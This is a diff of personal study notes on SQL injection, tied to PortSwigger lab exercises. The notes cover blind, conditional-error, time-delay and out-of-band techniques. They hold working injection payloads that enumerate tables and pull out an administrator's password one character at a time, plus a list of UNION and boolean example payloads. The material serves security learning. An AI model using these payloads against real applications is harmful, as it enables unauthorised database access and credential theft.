@@ -8,7 +8,7 @@
 > SQL queries inside web applications must connect to the database, submit the query, and then retrieve the results.
 
 > Can use [[SQLMap]] to automate this test.
-> [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+> [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
 ---
 
@@ -78,7 +78,6 @@
 2. Trigger a time delay using boolean injection to detect when the delay occurs in which boolean value.
 3. Trigger an out-of-band network interaction Out-of-band application security testing (OAST). For instance placing the data retrieved in a [[Domain Name System (DNS)]] lookup for a domain that you control.
 
-
 ##### Tracking [[Cookies]]. 
 > Some applications use tracking cookies to gather data about usage and users.
 > They are processed by a SQL query such as: 
@@ -91,7 +90,7 @@ SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
 > Use the value of the cookie along with true or false expressions using the `AND` operator to see how the website behaves differently.
 > Use this information of true/false behaviours to exploit the website.
 
-##### Conditional Errors LAB 13 IN WALKTHROUGHS
+##### Conditional Errors (Check the portswigger [lab](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors))
 
 > Sometimes boolean conditions do not affect the responses.
 > So we can trigger SQL errors conditionally, causing database errors. This might affect the response.
@@ -101,6 +100,7 @@ xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END)='' --
 xyz' || (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END)||' --
 ```
 > Use concatenation for easier expressions. Do not need to check equality in the end.
+> Note the single qoute at the end.
 
 > Knowing that the `FROM` part of a query is evaluated first then the `SELECT` part, lets use that to try and find the administrator user. `TO_CHAR` in oracle.
 ```
@@ -111,7 +111,7 @@ xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE u
 
 >To add any more conditions, add `AND` in the FROM clause.
 ```
-xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') AND length(password)>5 || ' --
+xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND length(password)>5) || ' --
 ```
 
 ##### Blind Enumeration 
@@ -137,8 +137,9 @@ HNgNNAq7tdrY9x17' AND (SELECT username FROM users WHERE username='administrator'
 ```
 HNgNNAq7tdrY9x17' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator')='a' --'
 ```
+> First 1 is the index, the second 1 is the length of the substring.
 
-#### Verbose SQL Error Messages
+##### Verbose SQL Error Messages
 
 > The error message shows the query we are injecting in, as well as the error message.
 > We can make the error message include the sensitive data we need.
@@ -164,21 +165,15 @@ CAST((SELECT x FROM y) AS int)
 * MySQL: `SELECT SLEEP(10)`
 * Oracle: `dbms_pipe.receive_message('a',10)
 
----
+##### Using OAST
 
-### Payloads
+> Out-of-bounds Application Security Testing.
+> Trigger a network interaction to a system controlled by attacker.
+> These interaction can be triggered conditionally.
+> Using the [[Domain Name System (DNS)]] [[Protocol]].
 
-> Try injecting: 
-* String terminators: `'` and `"`.
-* Other SQL commands: `SELECT`, `UNION`.
-* SQL comments: `--` or `#`. For MySQL and Microsoft, add a space then `-` .
-
-##### Example Payloads
-> `' OR 'a'='a ` .
-> `' UNION SELECT Username, Password FROM Accounts/users WHERE 'a'='a `.
-> `' UNION SELECT user(); -- - `. // comment then space then `-` to remove remainder of the query.
-> `2' AND 1=1; -- - `.
-
+> The payloads for OAST for the different databases are in the [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
+> To add them, use this `' || <payload> -- ` or `' UNION <payload> --`.
 ---
 
 ### Different Inputs and Obfuscating Attacks
@@ -208,19 +203,13 @@ SELECT @@version  //microsoft and MySQL
 SELECT version() // PostgreSQL
 ```
 
-> Getting the tables and their columns. Works on most databases.
-```
-SELECT * FROM information_schema.tables;
-```
-
-
 ##### Using Information_schema
 
 > Can use the `information_schema` database present in most systems (NOT IN ORACLE) to list the tables
 ```
 SELECT * FROM information_schema.tables 
 ```
-> The elements in this database are:
+> The elements in this database are: (instead of * you can use any of these)
 * TABLE_NAME
 * TABLE_CATALOG
 * TABLE_SCHEMA
@@ -228,9 +217,9 @@ SELECT * FROM information_schema.tables
 
 > Can use one of the tables output in the previous command to display the columns and data types of that table
 ```
-SELECT * FROM information_schema.columns WHERE table_name= <>
+SELECT * FROM information_schema.columns WHERE table_name= ''
 ```
-> The elements in this database are same as above and:
+> The elements in this database are same as above and: (instead of * you can use any of these)
 * COLUMN_NAME
 * DATA_TYPE
 
@@ -249,7 +238,20 @@ SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
 * COLUMN_NAME
 
 ---
+### Payloads
 
+> Try injecting: 
+* String terminators: `'` and `"`.
+* Other SQL commands: `SELECT`, `UNION`.
+* SQL comments: `--` or `#`. For MySQL and Microsoft, add a space then `-` .
+
+##### Example Payloads
+> `' OR 'a'='a ` .
+> `' UNION SELECT Username, Password FROM Accounts/users WHERE 'a'='a `.
+> `' UNION SELECT user(); -- - `. // comment then space then `-` to remove remainder of the query.
+> `2' AND 1=1; -- - `.
+
+---
 ### Extra Info
 
 > Commands to identify first character of username.
